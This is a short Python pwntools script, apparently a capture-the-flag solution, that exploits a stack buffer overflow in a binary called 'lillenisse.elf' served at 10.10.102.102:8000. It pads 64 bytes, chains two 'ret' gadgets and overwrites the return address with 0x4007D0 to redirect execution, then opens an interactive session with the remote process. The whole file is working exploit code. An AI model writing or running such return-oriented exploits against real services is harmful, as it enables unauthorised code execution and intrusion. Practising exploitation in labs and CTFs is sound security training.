import time

from pwnlib import gdb
import pwn
#pwn.context(arch='amd64', os='linux')
#pwn.context.log_level = "debug"
pwn.warnings.filterwarnings('ignore')

filepath = "./lillenisse.elf"


targetElf = pwn.ELF(filepath)


# Set up the process
#p = pwn.process(filepath)
p = pwn.remote('10.10.102.102', 8000)

#id, io_gdb = gdb.attach(p, api=True)
#bp = io_gdb.Breakpoint('*0x00000000004006C2', temporary=False)
#io_gdb.continue_nowait()


rop = pwn.ROP(targetElf)
ropRet = rop.find_gadget(['ret'])[0] 
print(hex(ropRet))


#time.sleep(15)


print(p.recvuntil("kodeordet:> "))

# RIP overwrite starts at offset 72, but first p64 seems corrupt
data  = b'A' * (72 - 8)
data += pwn.p64(ropRet)
data += pwn.p64(ropRet)
data += pwn.p64(0x00000000004007D0)		# .text:00000000004007D0 sub_4007D0
data += b'\n'

p.send(data)

p.interactive()
